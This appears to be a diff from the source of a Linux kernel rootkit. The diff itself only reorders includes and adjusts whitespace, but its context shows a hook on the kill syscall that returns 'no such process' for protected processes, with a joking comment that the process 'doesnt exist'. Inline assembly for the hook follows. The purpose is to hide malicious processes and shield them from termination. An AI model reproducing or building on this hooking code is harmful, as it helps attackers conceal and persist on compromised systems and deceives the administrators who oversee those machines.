@@ -1,5 +1,5 @@
-#include "../inc/hook.h"
 #include "../inc/cmds.h"
+#include "../inc/hook.h"
 #include "../inc/util.h"
 
 void *_kill = NULL;
@@ -9,7 +9,7 @@ asmlinkage int64_t h_kill(const struct pt_regs *r) {
   hfind(_kill, "__x64_sys_kill");
 
   // this also checks if the process' parent is protected
-  if(is_process_protected((pid_t)r->di))
+  if (is_process_protected((pid_t)r->di))
     return -ESRCH; // nah bro trust me it doesnt exist
 
   asm("mov %1, %%r15;"
